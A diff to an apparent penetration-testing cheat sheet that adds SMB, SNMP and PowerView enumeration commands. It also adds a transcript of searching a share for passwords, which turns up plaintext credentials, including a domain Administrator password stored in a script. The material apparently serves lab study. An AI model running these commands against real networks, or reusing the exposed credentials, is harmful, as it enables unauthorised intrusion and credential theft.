@@ -159,6 +159,7 @@ smbclient -L //<target> -N
 smbclient -L //<target> -U <user>%<pass>
 smbclient //<target>/<share> -N
 smbclient //<target>/<share> -U <user>
+smbclient -N -L \\\\10.129.42.253
 
 using rpcclient:
 rpcclient -U <user>%<pass> <target>
@@ -212,6 +213,20 @@ net use X: \\127.0.0.1\Exfil
 
 #Shows all mapped drives and active share connections.
 net use
+
+
+PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /m /s /i "pass" *.bat
+PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /m /s /i "pass" *.cmd
+PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /m /s /i "pass" *.ini
+setup.ini
+PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /m /s /i "pass" *.config
+4\5\4\web.config
+PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /m /s /i "pw" *.config
+PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /s /i "pw" *.config
+5\2\3\microsoft.config:pw BANANANANANANANANANANANANNAANANANANAS
+PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /m /s /i "eagle" *.ps1
+PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /s /i "eagle" *.ps1
+2\4\4\Software\connect.ps1:net use E: \\DC1\sharedScripts /user:eagle\Administrator Slavi123
 
 ```
 
@@ -269,6 +284,13 @@ ldap_shell domain.local/user -hashes aad3b435b51404eeaad3b435b51404ee:aad3b435b5
 # Kerberos authentication using TGT
 export KRB5CCNAME=/home/user/ticket.ccache
 ldap_shell -k -no-pass domain.local/user
+```
+
+Port 161 enumeration :
+```bash
+snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
+snmpwalk -v 2c -c private  10.129.42.253 
+onesixtyone -c dict.txt 10.129.42.254
 ```
 
 Port RDP 3389 enumeration :
@@ -398,6 +420,7 @@ Get-NetProcess | select ProcessName, User
 #Get information about share
 Invoke-ShareFinder
 Invoke-FileFinder
+Invoke-ShareFinder -domain eagle.local -ExcludeStandard -CheckShareAccess
 
 #Get information about hostname,admin access,active session
 Get-NetComputer | select dnshostname
